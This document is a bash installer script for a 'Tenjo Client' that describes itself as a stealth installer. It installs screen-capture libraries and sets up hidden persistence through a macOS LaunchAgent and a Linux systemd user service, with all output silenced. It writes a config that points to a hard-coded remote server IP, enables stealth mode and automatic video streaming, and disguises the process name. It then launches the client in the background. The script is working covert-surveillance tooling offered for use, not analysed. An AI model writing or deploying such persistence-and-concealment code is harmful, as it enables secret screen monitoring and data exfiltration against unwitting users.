#!/bin/bash
# Tenjo Client Stealth Installer
# Installs and configures automatic startup

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INSTALL_DIR="$HOME/.tenjo"
LOG_FILE="$HOME/.tenjo/install.log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
    echo -e "$1"
}

# Error handling
error_exit() {
    log "${RED}ERROR: $1${NC}"
    exit 1
}

# Success message
success() {
    log "${GREEN}SUCCESS: $1${NC}"
}

# Warning message
warn() {
    log "${YELLOW}WARNING: $1${NC}"
}

# Check if running as root
check_root() {
    if [[ $EUID -eq 0 ]]; then
        error_exit "This installer should not be run as root. Run as normal user."
    fi
}

# Check Python installation
check_python() {
    log "Checking Python installation..."
    
    if ! command -v python3 &> /dev/null; then
        error_exit "Python 3 is required but not installed."
    fi
    
    PYTHON_VERSION=$(python3 --version 2>&1 | cut -d' ' -f2)
    log "Found Python $PYTHON_VERSION"
    
    # Check required modules
    if ! python3 -c "import mss, PIL, requests" &> /dev/null; then
        warn "Some Python modules are missing. Installing..."
        pip3 install mss pillow requests || error_exit "Failed to install Python dependencies"
    fi
    
    success "Python environment is ready"
}

# Create installation directory
setup_directories() {
    log "Setting up directories..."
    
    mkdir -p "$INSTALL_DIR"
    mkdir -p "$INSTALL_DIR/logs"
    mkdir -p "$INSTALL_DIR/data"
    
    # Copy client files
    cp -r "$SCRIPT_DIR"/* "$INSTALL_DIR/"
    chmod +x "$INSTALL_DIR/main.py"
    
    success "Installation directory created at $INSTALL_DIR"
}

# Install autostart (macOS)
install_macos_autostart() {
    log "Installing macOS autostart..."
    
    PLIST_DIR="$HOME/Library/LaunchAgents"
    PLIST_FILE="$PLIST_DIR/com.tenjo.client.plist"
    
    mkdir -p "$PLIST_DIR"
    
    cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.tenjo.client</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$INSTALL_DIR/main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>WorkingDirectory</key>
    <string>$INSTALL_DIR</string>
</dict>
</plist>
EOF
    
    # Load the service
    launchctl unload "$PLIST_FILE" 2>/dev/null || true
    launchctl load "$PLIST_FILE" || error_exit "Failed to load LaunchAgent"
    
    success "macOS autostart installed"
}

# Install autostart (Linux)
install_linux_autostart() {
    log "Installing Linux autostart..."
    
    SERVICE_DIR="$HOME/.config/systemd/user"
    SERVICE_FILE="$SERVICE_DIR/tenjo-client.service"
    
    mkdir -p "$SERVICE_DIR"
    
    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=Tenjo Client
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $INSTALL_DIR/main.py
WorkingDirectory=$INSTALL_DIR
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF
    
    # Enable and start service
    systemctl --user daemon-reload
    systemctl --user enable tenjo-client.service || error_exit "Failed to enable systemd service"
    systemctl --user start tenjo-client.service || error_exit "Failed to start systemd service"
    
    success "Linux autostart installed"
}

# Configure stealth mode
configure_stealth() {
    log "Configuring stealth mode..."
    
    # Update config to use production server and enable stealth
    cat > "$INSTALL_DIR/src/core/config_override.py" << EOF
# Stealth configuration override
import os

class StealthConfig:
    # Server Configuration - PRODUCTION
    SERVER_URL = os.getenv('TENJO_SERVER_URL', "http://103.129.149.67")
    
    # Stealth Settings
    STEALTH_MODE = True
    AUTO_START_VIDEO_STREAMING = True
    LOG_LEVEL = "ERROR"  # Minimal logging
    
    # Hide process name
    PROCESS_NAME_DISGUISE = "python3"
EOF
    
    # Mark as installed
    echo "$(date '+%Y-%m-%d %H:%M:%S')" > "$INSTALL_DIR/data/.installed"
    
    success "Stealth mode configured"
}

# Main installation process
main() {
    log "Starting Tenjo Client Stealth Installation..."
    
    check_root
    check_python
    setup_directories
    configure_stealth
    
    # Platform-specific autostart installation
    case "$(uname -s)" in
        Darwin)
            install_macos_autostart
            ;;
        Linux)
            install_linux_autostart
            ;;
        *)
            warn "Autostart not supported on this platform. Manual startup required."
            ;;
    esac
    
    success "Installation completed successfully!"
    log "Client installed to: $INSTALL_DIR"
    log "The client will start automatically on next boot."
    log "To check status: launchctl list | grep tenjo (macOS) or systemctl --user status tenjo-client (Linux)"
    
    # Start client immediately
    log "Starting client now..."
    cd "$INSTALL_DIR"
    nohup python3 main.py > /dev/null 2>&1 &
    
    success "Tenjo Client is now running in stealth mode!"
}

# Run main function
main "$@"
